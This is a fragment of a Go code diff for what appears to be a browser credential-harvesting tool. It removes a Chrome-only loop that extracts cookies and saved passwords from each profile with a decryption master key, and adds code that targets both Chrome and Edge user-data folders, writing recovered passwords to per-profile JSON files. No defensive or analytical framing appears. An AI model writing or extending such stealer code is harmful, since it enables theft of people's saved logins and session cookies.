-		matched, _ := filepath.Match("Profile*", name)
-		if name != "Default" && !matched {
-			continue
-		}
-		
-		profileDir := filepath.Join(chromeUserData, name)
-		profileName := name
-		
-		fmt.Printf("\nProcessing profile: %s\n", profileName)
-		
-		if err := extractCookies(profileDir, profileName, masterKey); err != nil {
-			fmt.Printf("Cookie extraction failed: %v\n", err)
-		} else {
-			fmt.Printf("Cookies extracted\n")
-		}
-		
-		if err := extractPasswords(profileDir, profileName, masterKey); err != nil {
-			fmt.Printf("Password extraction failed: %v\n", err)
-		} else {
-			fmt.Printf(" Passwords extracted\n")
-		}
-	}
-	
+
+	// Common base
+	baseLocal := filepath.Join(userProfile, "AppData", "Local")
+
+	chromeUserData := filepath.Join(baseLocal, "Google", "Chrome", "User Data")
+	edgeUserData := filepath.Join(baseLocal, "Microsoft", "Edge", "User Data")
+
+	// Extract passwords for Chrome and Edge
+	runBrowserExtraction("chrome", chromeUserData)
+	runBrowserExtraction("edge", edgeUserData)
+
 	fmt.Println("\n=== Extraction complete! ===")
-	fmt.Println("Files saved in ./chrome/ directory")
+	fmt.Println("Chrome passwords: ./results/chrome/<profile>/passwords.json")
+	fmt.Println("Edge passwords:   ./results/edge/<profile>/passwords.json")
 }
